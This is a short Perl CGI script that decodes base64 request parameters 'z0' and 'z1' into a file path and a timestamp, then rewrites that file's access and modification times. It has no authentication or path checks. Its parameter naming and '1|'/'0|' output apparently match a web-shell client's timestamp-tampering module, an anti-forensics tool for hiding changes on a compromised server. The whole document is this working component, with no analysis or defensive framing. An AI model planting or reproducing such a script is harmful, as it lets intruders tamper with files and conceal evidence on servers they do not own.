use strict;
use warnings;
use CGI;
use MIME::Base64;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';

    my $filename  = decode_base64($z0);
    my $timestamp = int(decode_base64($z1));

    if (!-e $filename) {
        print "0|File does not exist.";
        return;
    }

    if (utime($timestamp, $timestamp, $filename) == 1) {
        print "1|";
    } else {
        print "0|Failed to modify the timestamps";
    }
}

main();